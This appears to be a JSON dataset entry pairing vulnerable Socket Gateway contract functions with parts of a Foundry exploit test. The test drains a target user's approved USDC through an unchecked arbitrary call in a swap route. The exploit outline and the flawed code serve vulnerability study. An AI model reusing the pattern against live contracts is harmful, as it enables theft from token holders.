@@ -1,0 +1,107 @@
+[
+  {
+    "contract/interface": "ISocketVulnRoute",
+    "source_type": "victim_contract",
+    "function_name": "performAction",
+    "original_code": "    function performAction(\n        address fromToken,\n        address toToken,\n        uint256 amount,\n        address receiverAddress,\n        bytes calldata swapExtraData\n    ) external payable override returns (uint256) {\n        uint256 returnAmount;\n\n        if (fromToken != NATIVE_TOKEN_ADDRESS) {\n            ERC20 token = ERC20(fromToken);\n            token.safeTransferFrom(msg.sender, socketGateway, amount);\n            token.safeApprove(ONEINCH_AGGREGATOR, amount);\n            {\n                // additional data is generated in off-chain using the OneInch API which takes in\n                // fromTokenAddress, toTokenAddress, amount, fromAddress, slippage, destReceiver, disableEstimate\n                (bool success, bytes memory result) = ONEINCH_AGGREGATOR.call(\n                    swapExtraData\n                );\n                token.safeApprove(ONEINCH_AGGREGATOR, 0);\n\n                if (!success) {\n                    revert SwapFailed();\n                }\n\n                returnAmount = abi.decode(result, (uint256));\n            }\n        } else {\n            // additional data is generated in off-chain using the OneInch API which takes in\n            // fromTokenAddress, toTokenAddress, amount, fromAddress, slippage, destReceiver, disableEstimate\n            (bool success, bytes memory result) = ONEINCH_AGGREGATOR.call{\n                value: amount\n            }(swapExtraData);\n            if (!success) {\n                revert SwapFailed();\n            }\n            returnAmount = abi.decode(result, (uint256));\n        }\n\n        emit SocketSwapTokens(\n            fromToken,\n            toToken,\n            returnAmount,\n            amount,\n            OneInchIdentifier,\n            receiverAddress\n        );\n\n        return returnAmount;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISocketGateway",
+    "source_type": "victim_contract",
+    "function_name": "executeRoute",
+    "original_code": "    function executeRoute(\n        uint32 routeId,\n        bytes calldata routeData\n    ) external payable returns (bytes memory) {\n        (bool success, bytes memory result) = addressAt(routeId).delegatecall(\n            routeData\n        );\n\n        if (!success) {\n            assembly {\n                revert(add(result, 32), mload(result))\n            }\n        }\n\n        return result;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_021_453);\n        USDC.approve(_gateway, type(uint256).max);\n        fundingToken = _usdc;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "SocketGatewayExp",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public balanceLog {\n        gateway.executeRoute(routeId, getRouteData(_usdc, targetUser));\n        require(USDC.balanceOf(address(this)) > 0, \"no usdc gotten\");\n    }\n",
+    "description": ""
+  }
+]
